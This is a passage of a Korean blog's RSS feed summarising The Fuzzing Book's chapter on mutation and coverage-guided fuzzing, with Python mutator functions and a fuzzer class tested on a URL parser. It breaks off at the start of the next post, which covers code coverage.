      <content:encoded><![CDATA[<p><a href="https://www.fuzzingbook.org/html/MutationFuzzer.html">https://www.fuzzingbook.org/html/MutationFuzzer.html</a></p><ul><li>대부분의 randomly generated inputs은 구문적으로 invalid하기에 프로그램에 의해 빠르게 거부된다.</li><li>따라서 유요한 입력을 얻을 수 있는 기회를 늘려야 한다.</li><li>그러한 방법 중 하나가 mutation fuzzing이다. </li><li>즉, 입력을 유효하게 유지하면서도 새로운 동작을 수행할 수 있도록 기존 입력에 작은 mutate를 하는 것이다.</li><li>AFL 퍼저는 위와 같은 개념의 fuzzing을 진행한다.<span id="more"></span></li></ul><hr><h1 id="Synopsis"><a href="#Synopsis" class="headerlink" title="Synopsis"></a>Synopsis</h1><ul><li><code>MutationFuzzer</code> Class : mutated된 시드 입력 목록을 생성한다.</li><li><code>MutationCoverageFuzzer</code> Class : 커버리지를 최대화 하기 위해 계속 input을 mutate한다.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/155466103-1c3ef6cb-7a79-4c59-9b96-14821eb677aa.png" alt="image"></p><hr><h1 id="Fuzzing-with-Mutations"><a href="#Fuzzing-with-Mutations" class="headerlink" title="Fuzzing with Mutations"></a>Fuzzing with Mutations</h1><ul><li>AFL은 퍼징을 자동 취약점 탐지에 대해 대중적인 선택으로 만들었다.</li><li>coverage guided fuzzing을 진행한다.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/155466884-0ec0e3a0-392d-49ec-9d1c-b908a8739445.png" alt="image"></p><h1 id="Fuzzing-a-URL-Parser"><a href="#Fuzzing-a-URL-Parser" class="headerlink" title="Fuzzing a URL Parser"></a>Fuzzing a URL Parser</h1><ul><li>많은 프로그램은 실제로 입력을 처리하기 전에 매우 구체적인 형식으로 입력되기를 기대한다.</li><li>URL을 허용하는 프로그램은, URL을 처리할 수 있도록 input이 URL 형식이어야 한다.</li><li>하지만 무작위 입력으로 퍼징을 한다면, 실제로 유효한 URL 형식을 만들 수 있는 확률이 얼마나 될까.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme:<span class="comment">//netloc/path?query#fragment</span></span><br></pre></td></tr></table></figure><ul><li>URL은 위와 같은 형식으로 구성되어 있다.<ul><li>scheme : 사용되는 프로토콜, http, https, ftp, file..</li><li>netloc : 연결할 호스트의 이름, <a href="http://www.google.com/">www.google.com</a></li><li>path : 호스트의 경로.</li><li>query : 키/값 쌍의 목록, q=fuzzing</li><li>fragment : 검색된 문서의 위치에 대한 마커, #result</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urlparse(<span class="string">&quot;http://www.google.com/search?q=fuzzing&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/49066484/155467875-f5ef97a6-108d-43c1-84ab-0118a430a96d.png" alt="image"></p><ul><li><p>python에서는 urlparse 기능을 제공하여 위와 같이 구성 목록을 확인할 수 있다.</p></li><li><p>URL을 입력으로 하는 프로그램이 있다고 가정하고, URL이 올바르면 True, 아니라면 예외를 발생시킨다.</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">http_program</span>(<span class="params">url: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span></span><br><span class="line">    supported_schemes = [<span class="string">&quot;http&quot;</span>, <span class="string">&quot;https&quot;</span>]</span><br><span class="line">    result = urlparse(url)</span><br><span class="line">    <span class="keyword">if</span> result.scheme <span class="keyword">not</span> <span class="keyword">in</span> supported_schemes:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Scheme must be one of &quot;</span> + </span><br><span class="line">                         <span class="built_in">repr</span>(supported_schemes))</span><br><span class="line">    <span class="keyword">if</span> result.netloc == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Host must be non-empty&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Do something with the URL</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><ul><li>위 프로그램을 완전 랜덤 퍼징으로 진행해본다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = fuzzer()</span><br><span class="line">        result = http_program(url)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Success!&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><ul><li>올바른 URL을 얻을 확률은 얼마나 될까?</li><li>먼저 “http://“, “https://“ 로시작하는 문자열이 필요하다.</li><li>또한 url 구조에 알맞은 형태로 값이 들어가야 한다.</li><li>성공적으로 랜덤 input을 만들기까지 몇 달에서 몇년이 걸릴 것이며 이는 http_program()에 들어갈 하나의 성공적인 실행을 얻기 위한 것이다.</li></ul><h1 id="Mutation-Inputs"><a href="#Mutation-Inputs" class="headerlink" title="Mutation Inputs"></a>Mutation Inputs</h1><ul><li>처음부터 랜덤 input을 생성하는 것의 대안은 주어진 유효한 입력으로 시작한 다음 그 입력을 mutate하는 방식이다.</li><li>mutate 방식에는 문자 삽입, 문자 삭제, 비트 플립이 있다.</li><li>이러한 방식을 Mutation fuzzing이라 부른다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_random_character</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns s with a random character deleted&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> s == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">    pos = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(s) - <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># print(&quot;Deleting&quot;, repr(s[pos]), &quot;at&quot;, pos)</span></span><br><span class="line">    <span class="keyword">return</span> s[:pos] + s[pos + <span class="number">1</span>:]</span><br></pre></td></tr></table></figure><ul><li>인자로 받은 문자열에서 랜덤으로 문자 하나를 삭제하는 함수이다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert_random_character</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns s with a random character inserted&quot;&quot;&quot;</span></span><br><span class="line">    pos = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(s))</span><br><span class="line">    random_character = <span class="built_in">chr</span>(random.randrange(<span class="number">32</span>, <span class="number">127</span>))</span><br><span class="line">    <span class="comment"># print(&quot;Inserting&quot;, repr(random_character), &quot;at&quot;, pos)</span></span><br><span class="line">    <span class="keyword">return</span> s[:pos] + random_character + s[pos:]</span><br></pre></td></tr></table></figure><ul><li>인자로 받은 문자열에 랜덤으로 문자 하나를 추가하는 함수이다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flip_random_character</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns s with a random bit flipped in a random position&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> s == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">    pos = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(s) - <span class="number">1</span>)</span><br><span class="line">    c = s[pos]</span><br><span class="line">    bit = <span class="number">1</span> &lt;&lt; random.randint(<span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line">    new_c = <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) ^ bit)</span><br><span class="line">    <span class="comment"># print(&quot;Flipping&quot;, bit, &quot;in&quot;, repr(c) + &quot;, giving&quot;, repr(new_c))</span></span><br><span class="line">    <span class="keyword">return</span> s[:pos] + new_c + s[pos + <span class="number">1</span>:]</span><br></pre></td></tr></table></figure><ul><li>인자로 받은 문자열에 랜덤으로 문자 하나에 대해 비트 플립 연산을 하는 함수이다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mutate</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Return s with a random mutation applied&quot;&quot;&quot;</span></span><br><span class="line">    mutators = [</span><br><span class="line">        delete_random_character,</span><br><span class="line">        insert_random_character,</span><br><span class="line">        flip_random_character</span><br><span class="line">    ]</span><br><span class="line">    mutator = random.choice(mutators)</span><br><span class="line">    <span class="comment"># print(mutator)</span></span><br><span class="line">    <span class="keyword">return</span> mutator(s)</span><br></pre></td></tr></table></figure><ul><li>그리고 위 함수들을 모아 랜덤으로 mutate할 방식을 고르도록 하여 임의성을 더욱 높힌다.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/155471053-ba042297-094e-45c3-bd63-55b74b59eae7.png" alt="image"></p><h1 id="Mutating-URLs"><a href="#Mutating-URLs" class="headerlink" title="Mutating URLs"></a>Mutating URLs</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_valid_url</span>(<span class="params">url: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = http_program(url)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><ul><li>유효한 URL인지 확인하는 함수를 하나 만든다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">seed_input = <span class="string">&quot;http://www.google.com/search?q=fuzzing&quot;</span></span><br><span class="line">valid_inputs = <span class="built_in">set</span>()</span><br><span class="line">trials = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(trials):</span><br><span class="line">    inp = mutate(seed_input)</span><br><span class="line">    <span class="keyword">if</span> is_valid_url(inp):</span><br><span class="line">        valid_inputs.add(inp)</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/49066484/155471647-9be0a174-54ef-4841-8a91-c3a601199def.png" alt="image"></p><ul><li>결과로 높은 비율의 유효한 입력을 얻을 수 있다.</li></ul><h1 id="Multiple-Mutations"><a href="#Multiple-Mutations" class="headerlink" title="Multiple Mutations"></a>Multiple Mutations</h1><ul><li>앞서 오직 한번의 mutation만 진행했는데, 이를 여러번 적용할 수 있다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">seed_input = <span class="string">&quot;http://www.google.com/search?q=fuzzing&quot;</span></span><br><span class="line">mutations = <span class="number">50</span></span><br><span class="line"></span><br><span class="line">inp = seed_input</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(mutations):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">5</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(i, <span class="string">&quot;mutations:&quot;</span>, <span class="built_in">repr</span>(inp))</span><br><span class="line">    inp = mutate(inp)</span><br></pre></td></tr></table></figure><ul><li>원래 시드 입력은 더 이상 알아볼수 없으며, 이렇게 입력을 계속해 변형시킴으로써 입력에 더 높은 다양성을 얻는다.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/155472504-4844327b-5b4b-4000-acc7-ac4ec254818b.png" alt="image"></p><ul><li>여러 Mutation을 구현하기 위해 <code>MutationFuzzer</code> Class를 도입한다.</li><li>Seed, min_mutations, max_mutations이 필요하다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MutationFuzzer</span>(<span class="params">Fuzzer</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Base class for mutational fuzzing&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, seed: <span class="type">List</span>[<span class="built_in">str</span>],</span></span></span><br><span class="line"><span class="params"><span class="function">                 min_mutations: <span class="built_in">int</span> = <span class="number">2</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                 max_mutations: <span class="built_in">int</span> = <span class="number">10</span></span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Constructor.</span></span><br><span class="line"><span class="string">        `seed` - a list of (input) strings to mutate.</span></span><br><span class="line"><span class="string">        `min_mutations` - the minimum number of mutations to apply.</span></span><br><span class="line"><span class="string">        `max_mutations` - the maximum number of mutations to apply.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.seed = seed</span><br><span class="line">        self.min_mutations = min_mutations</span><br><span class="line">        self.max_mutations = max_mutations</span><br><span class="line">        self.reset()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reset</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Set population to initial seed.</span></span><br><span class="line"><span class="string">        To be overloaded in subclasses.&quot;&quot;&quot;</span></span><br><span class="line">        self.population = self.seed</span><br><span class="line">        self.seed_index = <span class="number">0</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MutationFuzzer</span>(<span class="params">MutationFuzzer</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mutate</span>(<span class="params">self, inp: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">        <span class="keyword">return</span> mutate(inp)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_candidate</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Create a new candidate by mutating a population member&quot;&quot;&quot;</span></span><br><span class="line">        candidate = random.choice(self.population)</span><br><span class="line">        trials = random.randint(self.min_mutations, self.max_mutations)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(trials):</span><br><span class="line">            candidate = self.mutate(candidate)</span><br><span class="line">        <span class="keyword">return</span> candidate</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fuzz</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.seed_index &lt; <span class="built_in">len</span>(self.seed):</span><br><span class="line">            <span class="comment"># Still seeding</span></span><br><span class="line">            self.inp = self.seed[self.seed_index]</span><br><span class="line">            self.seed_index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># Mutating</span></span><br><span class="line">            self.inp = self.create_candidate()</span><br><span class="line">        <span class="keyword">return</span> self.inp</span><br></pre></td></tr></table></figure><ul><li> fuzz 함수를 살펴보면 먼저 seed 리스트에 있는 문자열을 한 번씩 사용 후, create_candidate()함수를 호출해 mutate하게 된다.</li><li> input의 다양성이 높을수록 유효하지 않은 값이 생길 수 있다. 하지만 이러한 mutation을 guide하는 것이 핵심 아이디어다.</li><li> 즉 가치있는 mutation을 유지하는 것이다.</li></ul><h1 id="Guiding-by-Coverage"><a href="#Guiding-by-Coverage" class="headerlink" title="Guiding by Coverage"></a>Guiding by Coverage</h1><ul><li><p>테스트는 항상 프로그램을 실행하므로 실행 정보를 수집할 수 있다.</p></li><li><p>최소한 테스트의 통과 여부를 결정하는데 필요한 정보는 필요하다.</p></li><li><p>커버리지는 테스트 품질을 결정하기 위해 자주 측정되므로 테스트 실행의 커버리지도 검색할 수 있다 가정한다.</p></li><li><p>우리는 어떻게 커버리지를 to guide test generation 하기 위해 활용할 수 있을까?</p></li><li><p>성공적인 아이디어는 AFL이라는 퍼저에서 구현된다.</p></li><li><p>AFL은 성공적인 테스트 사례를 발전 시킨다.</p></li><li><p>AFL에서 “성공”은 프로그램 실행을 통해 새로운 경로를 찾는 것이다.</p></li><li><p>이런식으로 AFL은 지금까지 새로운 경로를 찾았던 입력을 계속 mutate할 수 있으며,</p></li><li><p>입력이 다른 경로를 찾더라도 이 또한 유지가 된다.</p></li><li><p>urlparse를 대상으로 이를 구현해본다.</p></li></ul><p><code>FunctionRunner</code> Class</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FunctionRunner</span>(<span class="params">Runner</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, function: <span class="type">Callable</span></span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Initialize.  `function` is a function to be executed&quot;&quot;&quot;</span></span><br><span class="line">        self.function = function</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_function</span>(<span class="params">self, inp: <span class="built_in">str</span></span>) -&gt; <span class="type">Any</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.function(inp)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, inp: <span class="built_in">str</span></span>) -&gt; <span class="type">Tuple</span>[<span class="type">Any</span>, <span class="built_in">str</span>]:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = self.run_function(inp)</span><br><span class="line">            outcome = self.PASS</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            result = <span class="literal">None</span></span><br><span class="line">            outcome = self.FAIL</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result, outcome</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FunctionCoverageRunner</span>(<span class="params">FunctionRunner</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_function</span>(<span class="params">self, inp: <span class="built_in">str</span></span>) -&gt; <span class="type">Any</span>:</span></span><br><span class="line">        <span class="keyword">with</span> Coverage() <span class="keyword">as</span> cov:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                result = <span class="built_in">super</span>().run_function(inp)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> exc:</span><br><span class="line">                self._coverage = cov.coverage()</span><br><span class="line">                <span class="keyword">raise</span> exc</span><br><span class="line"></span><br><span class="line">        self._coverage = cov.coverage()</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">coverage</span>(<span class="params">self</span>) -&gt; <span class="type">Set</span>[Location]:</span></span><br><span class="line">        <span class="keyword">return</span> self._coverage</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http_runner = FunctionCoverageRunner(http_program)</span><br><span class="line">http_runner.run(<span class="string">&quot;https://foo.bar/&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/49066484/155478279-78486649-a0c6-4a7c-b2e3-16e03ca27fa2.png" alt="image"></p><ul><li>커버리지를 측정하는 runner를 만든다.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MutationCoverageFuzzer</span>(<span class="params">MutationFuzzer</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Fuzz with mutated inputs based on coverage&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reset</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        <span class="built_in">super</span>().reset()</span><br><span class="line">        self.coverages_seen: <span class="type">Set</span>[<span class="built_in">frozenset</span>] = <span class="built_in">set</span>()</span><br><span class="line">        <span class="comment"># Now empty; we fill this with seed in the first fuzz runs</span></span><br><span class="line">        self.population = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, runner: FunctionCoverageRunner</span>) -&gt; <span class="type">Any</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Run function(inp) while tracking coverage.</span></span><br><span class="line"><span class="string">           If we reach new coverage,</span></span><br><span class="line"><span class="string">           add inp to population and its coverage to population_coverage</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        result, outcome = <span class="built_in">super</span>().run(runner)</span><br><span class="line">        new_coverage = <span class="built_in">frozenset</span>(runner.coverage())</span><br><span class="line">        <span class="keyword">if</span> outcome == Runner.PASS <span class="keyword">and</span> new_coverage <span class="keyword">not</span> <span class="keyword">in</span> self.coverages_seen:</span><br><span class="line">            <span class="comment"># We have new coverage</span></span><br><span class="line">            self.population.append(self.inp)</span><br><span class="line">            self.coverages_seen.add(new_coverage)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">seed_input = <span class="string">&quot;http://www.google.com/search?q=fuzzing&quot;</span></span><br><span class="line">mutation_fuzzer = MutationCoverageFuzzer(seed=[seed_input])</span><br><span class="line">mutation_fuzzer.runs(http_runner, trials=<span class="number">10000</span>)</span><br><span class="line">mutation_fuzzer.population</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/49066484/155478596-f60d5195-3c5a-45a1-abd5-79623abdd427.png" alt="image"></p><ul><li><p>각각의 모든 입력은 현재 유효하며, schemes, paths, queries, fragments의 다양한 조합에서 오는 서로 다른 커버리지를 가지고 있다.</p></li><li><p>따라서 완전 무작위 fuzzing보다 커버리지를 사용한 mutate fuzzing이 효율적일 수 있다.</p></li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Fuzzing/">Fuzzing</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/fuzzing/">fuzzing</category>
      
      <category domain="https://pwnkidhn.github.io/tags/theory/">theory</category>
      
      
      <comments>https://pwnkidhn.github.io/2022/02/23/2022-02-24-03_Mutation/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>The Fuzzing Book_02_Coverage</title>
      <link>https://pwnkidhn.github.io/2022/02/21/2022-02-23-02_Coverage/</link>
      <guid>https://pwnkidhn.github.io/2022/02/21/2022-02-23-02_Coverage/</guid>
      <pubDate>Mon, 21 Feb 2022 15:00:00 GMT</pubDate>
      
      <description>&lt;p&gt;&lt;a href=&quot;https://www.fuzzingbook.org/html/Coverage.html&quot;&gt;https://www.fuzzingbook.org/html/Coverage.html&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Coverage란, 소프트웨어 테스팅을 하는데 사용되는 지표 중 하나로, Code가 얼마나 실행되었느냐를 측정한다.&lt;/li&gt;
&lt;li&gt;Coverage를 측정하기 위해 instrumentation을 한다.&lt;/li&gt;
&lt;li&gt;instrumentation은 작성된 코드가 실행되는 지를 확인하는 코드를 작성된 코드 사이사이에 삽입하는 것을 뜻한다.&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;Function coverage : 함수가 최소한 한 번 실행되었는 가를 측정한다. function call을 했는지만을 확인하기 때문에 해당 function안의 모든 코드가 실행되었는 지는 확인할 수 없다.&lt;/li&gt;
&lt;/ol&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;Statement coverage : 각 statement가 실행 되었는지를 측정한다. &lt;ul&gt;
&lt;li&gt;장점 : object code에 바로 적용 될 수 있다.&lt;/li&gt;
